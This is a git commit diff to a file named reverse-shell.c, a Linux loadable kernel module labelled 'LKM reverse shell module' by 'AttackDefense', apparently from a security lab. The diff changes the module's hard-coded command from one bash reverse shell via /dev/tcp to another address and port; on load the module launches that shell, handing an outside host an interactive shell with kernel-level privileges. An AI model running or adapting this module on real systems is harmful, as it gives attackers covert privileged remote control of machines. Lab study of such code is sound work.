2303835c08e62d10c1948aabcd06443a5b277d7e
0xJin <81621963+0xJin@users.noreply.github.com>
2024-10-26 20:01:41 +0200

    Update reverse-shell.c

--- reverse-shell.c
+++ reverse-shell.c
@@ -6,7 +6,7 @@ MODULE_AUTHOR("AttackDefense");
 MODULE_DESCRIPTION("LKM reverse shell module");
 MODULE_VERSION("1.0");
 
-char *argv[] = {"/bin/bash", "-c", "bash -i >& /dev/tcp/172.28.0.12/9001 0>&1", NULL};
+char *argv[] = {"/bin/bash", "-c", "bash -i >& /dev/tcp/10.88.0.6/4444 0>&1", NULL};
 static char *envp[] = { "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", NULL };
 
 static int __init reverse_shell_init(void) {
